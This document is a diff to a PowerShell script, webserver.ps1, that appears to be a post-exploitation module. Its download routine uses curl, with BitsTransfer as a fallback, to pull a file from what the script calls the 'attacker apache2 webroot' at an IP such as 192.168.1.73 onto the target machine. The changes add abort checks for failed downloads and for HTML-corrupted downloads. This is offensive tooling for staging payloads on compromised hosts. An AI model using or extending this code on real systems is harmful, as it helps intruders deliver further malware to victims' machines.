@@ -181,6 +181,7 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    .NOTES
       File to Download must be stored in attacker apache2 webroot.
       Double quotes are mandatory in this parameter value inputs.
+      Localhost connections (127.0.0.1) are not supported.
 
    .EXAMPLE
       PS C:\> .\webserver.ps1 -Download "192.168.1.73,CompDefaults.ps1"
@@ -188,12 +189,12 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
       webroot to @webserver.ps1 remote working directory.
    #>
 
-   If($ServerIP -Match '127.0.0.1'){## Localhost connections not supported by this module
-      Write-Host "[abort] 127.0.0.1 (localhost) connections not supported" -ForeGroundColor Red -BackGroundColor Black
+   Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor Green;Start-Sleep -Seconds 1
+   If($ServerIP -Match '127.0.0.1'){## Localhost connections are not supported by this module
+      Write-Host "[abort] 127.0.0.1 (localhost) connections are not supported." -ForeGroundColor Red -BackGroundColor Black
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
    }
 
-   Write-Host "Downloading $FileName to $Initial_Path" -ForeGroundColor Green
    cmd /c curl -s http://$ServerIP/$FileName -o $FileName|Out-Null
    If(-not($LASTEXITCODE -eq 0)){## Download using BitsTransfer service insted of curl.exe
       Write-Host "[fail] to download $FileName using curl.exe service" -ForeGroundColor Red -BackgroundColor Black
@@ -206,10 +207,19 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    If(-not([System.IO.File]::Exists("$Initial_Path\$FileName")) -or $FileName -ieq $Null){
       Write-Host "`nRemark : File to download must be stored in attacker apache2 webroot." -ForeGroundColor Yellow
       Write-Host "syntax : .\webserver.ps1 -Download `"<Apache2-IP>,<FileName.ps1>`"" -ForeGroundColor Yellow 
-      Write-Host "example: .\webserver.ps1 -Download `"192.168.1.73,FileName.ps1`"" -ForeGroundColor Yellow   
+      Write-Host "example: .\webserver.ps1 -Download `"192.168.1.73,FileName.ps1`"" -ForeGroundColor Yellow
+      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver  
    }
 
-   ## Build Table Display
+   If(-not($FileName -Match '.exe')){## This test does not work on binary files (.exe)
+      $Status = Get-Content -Path "$Initial_Path\$FileName"
+      If($Status -Match '<!DOCTYPE html' -or $Status -Match '^[<]'){## Make sure that the download file its not a 'DOCTYPE html' document
+         Start-Sleep -Seconds 1;Write-Host "[abort] $FileName download corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
+      }
+   }
+
+   ## Build Object-Table Display
    If(Test-Path -Path "$Initial_Path\$FileName"){
       Get-ChildItem -Path "$Initial_Path\$FileName" -EA SilentlyContinue|Select-Object Directory,Name,Exists,CreationTime > $Env:LOCALAPPDATA\download.log
       Get-Content -Path "$Env:LOCALAPPDATA\download.log";Remove-Item "$Env:LOCALAPPDATA\download.log" -Force
